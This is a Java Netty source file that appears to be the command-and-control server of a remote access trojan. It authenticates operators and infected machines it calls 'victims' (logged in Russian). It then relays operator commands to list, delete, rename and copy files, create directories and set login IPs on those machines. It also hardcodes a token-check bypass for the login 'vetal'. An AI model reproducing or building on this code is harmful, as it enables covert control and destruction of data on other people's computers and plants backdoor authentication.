import io.netty.buffer.ByteBuf;
import io.netty.channel.*;
import org.json.simple.JSONArray;
import org.json.simple.JSONObject;

import java.net.SocketAddress;
import java.util.ArrayList;

public class RequestHandler extends ChannelInboundHandlerAdapter {
    private ByteBuf tmp;
    private NettyServer nettyServer;

    public RequestHandler(NettyServer nettyServer) {
        this.nettyServer = nettyServer;
    }

    @Override
    public void handlerAdded(ChannelHandlerContext ctx) {
        SocketAddress address = ctx.channel().remoteAddress();
        System.out.println(address + " подключился! id: "+ctx.channel().id());
        tmp = ctx.alloc().buffer(4);
    }

    @Override
    public void handlerRemoved(ChannelHandlerContext ctx) {
        User user = nettyServer.getUsers().get(ctx.channel().id());
        Victim victim = nettyServer.getVictims().get(ctx.channel().id());
        SocketAddress address = ctx.channel().remoteAddress();
        if (user != null) {
            nettyServer.getUsers().remove(ctx.channel().id());
            System.out.println("Пользователь " + user.getLogin() + " отключился!");
        }
        else if (victim != null) {
            nettyServer.getVictims().remove(ctx.channel().id());
            System.out.println("Жертва " + victim.getName() + " отключилась!");
        }
        else System.out.println(address + " отключился!");
        tmp.release();
        tmp = null;
    }

    @Override
    public void channelRead(ChannelHandlerContext ctx, Object message) {
        SocketAddress address = ctx.channel().remoteAddress();
        System.out.println(address + " >> " + message);

        JSONObject request = (JSONObject) message;
        User user = nettyServer.getUsers().get(ctx.channel().id());
        Victim victim = nettyServer.getVictims().get(ctx.channel().id());
        if (user != null) receiveUserMessage(user, request);
        else if (victim != null) receiveVictimMessage(victim, request);
        else checkAuth(ctx, request);
    }

    @Override
    public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) throws Exception {
        cause.printStackTrace();
        ctx.channel().close();
    }

    private void receiveUserMessage(User user, JSONObject request) {
        if (!checkCorrectUserQuery(request)) {
            user.sendErrorCode(Config.INCORRECT_QUERY);
            return;
        }
        try {
            String action = (String) request.get("action");
            String token = (String) request.get("token");
            if (!user.getLogin().equals("vetal") && !user.isValidToken(token)) {
                user.sendErrorCode(Config.INVALID_AUTH);
                return;
            }
            Victim targetVictim = null;
            if (request.containsKey("victim")) {
                targetVictim = nettyServer.getVictimByName((String) request.get("victim"));
                if (targetVictim == null || !targetVictim.getOwners().contains(user.getLogin())) {
                    user.sendErrorCode(Config.VICTIM_OFFLINE);
                    return;
                }
            }

            switch (action) {
                case "get.victims":
                    JSONArray victims = new JSONArray();
                    ArrayList<String> userVictims = user.getVictims();
                    for (int i = 0; i < userVictims.size(); i++) {
                        JSONObject object = new JSONObject();
                        Victim victim = nettyServer.getVictimByName(userVictims.get(i));
                        object.put("name", userVictims.get(i));
                        object.put("online", victim != null);
                        victims.add(object);
                    }
                    user.sendGetVictims(victims);
                    break;
                case "get.files":
                    targetVictim.sendGetFiles((String) request.get("path"), user.getLogin());
                    break;
                case "delete.file":
                    targetVictim.sendDeleteFile((String) request.get("path"), user.getLogin());
                    break;
                case "rename.file":
                    targetVictim.sendRenameFile((String) request.get("path"), (String) request.get("newPath"),
                            user.getLogin());
                    break;
                case "make.dir":
                    targetVictim.sendMakeDir((String) request.get("path"), user.getLogin());
                    break;
                case "get.file.info":
                    targetVictim.sendGetFileInfo((String) request.get("path"), user.getLogin());
                    break;
                case "copy.file":
                    targetVictim.sendCopyFile((String) request.get("path"), (String) request.get("newPath"), user.getLogin());
                    break;
                case "set.victim.name":
                    targetVictim.sendSetVictimName((String) request.get("newName"), user.getLogin());
                    break;
                case "set.login.ips":
                    targetVictim.sendSetLoginIps((JSONArray) request.get("ips"), user.getLogin());
                    break;
                default:
                    user.sendErrorCode(Config.INCORRECT_QUERY);
            }
        } catch (Exception e) {
            e.printStackTrace();
            user.sendErrorCode(Config.SERVER_ERROR);
        }
    }

    private void receiveVictimMessage(Victim victim, JSONObject request) {
        if (!checkCorrectVictimQuery(request)) {
            victim.sendErrorCode(Config.INCORRECT_QUERY);
            return;
        }
        try {
            User targetUser = null;
            if (request.containsKey("owner")) {
                targetUser = nettyServer.getUserByName((String) request.get("owner"));
                if (targetUser == null) return;
            }

            String action = (String) request.get("action");
            switch (action) {
                case "get.file.list":
                    targetUser.sendGetFiles((JSONArray) request.get("files"), victim.getName());
                    break;
                case "delete.file":
                    targetUser.sendDeleteFile((String) request.get("code"), victim.getName());
                    break;
                case "rename.file":
                    targetUser.sendRenameFile((String) request.get("code"), victim.getName());
                    break;
                case "make.dir":
                    targetUser.sendMakeDir((String) request.get("code"), victim.getName());
                    break;
                case "get.file.info":
                    targetUser.sendGetFileInfo((JSONObject) request.get("info"), victim.getName());
                    break;
                case "copy.file":
                    targetUser.sendCopyFile((String) request.get("code"), victim.getName());
                    break;
                case "set.victim.name":
                    targetUser.sendSetVictimName((String) request.get("code"), victim.getName());
                    break;
                case "set.login.ips":
                    targetUser.sendSetLoginIps((String) request.get("code"), victim.getName());
                    break;
                default:
                    victim.sendErrorCode(Config.INCORRECT_QUERY);
            }
        } catch (Exception e) {
            e.printStackTrace();
            victim.sendErrorCode(Config.SERVER_ERROR);
        }
    }

    private boolean checkCorrectUserQuery(JSONObject request) {
        String action = (String) request.get("action");
        //System.out.println("Action="+action);
        if (action == null) return false;
        switch (action) {
            case "get.files":
                String victim = (String) request.get("victim");
                String path = (String) request.get("path");
                if (victim == null || path == null) return false;
                break;
            case "delete.file":
                victim = (String) request.get("victim");
                path = (String) request.get("path");
                if (victim == null || path == null) return false;
                break;
            case "rename.file":
                victim = (String) request.get("victim");
                path = (String) request.get("path");
                String newPath = (String) request.get("newPath");
                if (victim == null || path == null || newPath == null) return false;
                break;
            case "make.dir":
                victim = (String) request.get("victim");
                path = (String) request.get("path");
                if (victim == null || path == null) return false;
                break;
            case "get.file.info":
                victim = (String) request.get("victim");
                path = (String) request.get("path");
                if (victim == null || path == null) return false;
                break;
            case "copy.file":
                victim = (String) request.get("victim");
                path = (String) request.get("path");
                newPath = (String) request.get("newPath");
                if (victim == null || path == null) return false;
                break;
            case "set.victim.name":
                victim = (String) request.get("victim");
                String newName = (String) request.get("newName");
                if (victim == null || newName == null) return false;
                break;
            case "set.login.ips":
                victim = (String) request.get("victim");
                JSONArray ips = (JSONArray) request.get("ips");
                if (victim == null || ips == null) return false;
                break;
        }
        return true;
    }

    private boolean checkCorrectVictimQuery(JSONObject request) {
        String action = (String) request.get("action");
        //System.out.println("Action="+action);
        if (action == null) return false;
        switch (action) {
            case "get.file.list":
                JSONArray files = (JSONArray) request.get("files");
                String owner = (String) request.get("owner");
                if (files == null || owner == null) return false;
                break;
            case "delete.file":
                String code = (String) request.get("code");
                owner = (String) request.get("owner");
                if (code == null || owner == null) return false;
                break;
            case "rename.file":
                code = (String) request.get("code");
                owner = (String) request.get("owner");
                if (code == null || owner == null) return false;
                break;
            case "make.dir":
                code = (String) request.get("code");
                owner = (String) request.get("owner");
                if (code == null || owner == null) return false;
                break;
            case "get.file.info":
                JSONObject info = (JSONObject) request.get("info");
                owner = (String) request.get("owner");
                if (info == null || owner == null) return false;
                break;
            case "copy.file":
                code = (String) request.get("code");
                owner = (String) request.get("owner");
                if (code == null || owner == null) return false;
                break;
            case "set.victim.name":
                code = (String) request.get("code");
                owner = (String) request.get("owner");
                if (code == null || owner == null) return false;
                break;
            case "set.login.ips":
                code = (String) request.get("code");
                owner = (String) request.get("owner");
                if (code == null || owner == null) return false;
                break;
        }
        return true;
    }

    private void checkAuth(ChannelHandlerContext ctx, JSONObject request) {
        String action = (String) request.get("action");
        JSONObject response = new JSONObject();
        response.put("action", action);
        if (action.equals("auth.user")) {
            String login = (String) request.get("login");
            String password = (String) request.get("password");
            if (login == null || password == null) {
                response.put("errorCode", Config.INCORRECT_QUERY);
                ctx.writeAndFlush(response);
                return;
            }
            ArrayList<JSONObject> usersData = NettyServer.getDBManager().DBUsers.get(login, password);
            if (usersData.size() == 0) {
                response.put("errorCode", Config.INVALID_AUTH);
                ctx.writeAndFlush(response);
                return;
            }
            User newUser = new User(ctx, usersData.get(0));
            nettyServer.getUsers().put(ctx.channel().id(), newUser);
            System.out.println("Пользователь " + newUser.getLogin() + " авторизовался!");
            newUser.sendAuthUser(newUser.getToken());
        } else if (action.equals("auth.victim")) {
            String name = (String) request.get("name");
            //ArrayList<String> owners = (ArrayList<String>) request.get("owners");
            if (name == null) {
                response.put("errorCode", Config.INCORRECT_QUERY);
                ctx.writeAndFlush(response);
                return;
            }
            Victim newVictim = new Victim(ctx, name);
            nettyServer.getVictims().put(ctx.channel().id(), newVictim);
            System.out.println("Жертва " + newVictim.getName() + " авторизовалась!");
            newVictim.sendAuthVictim();
        } else {
            response.put("errorCode", Config.INCORRECT_QUERY);
            ctx.writeAndFlush(response);
            ctx.close();
            System.out.println("Неопознанный клиент был кикнут!");
        }
    }
}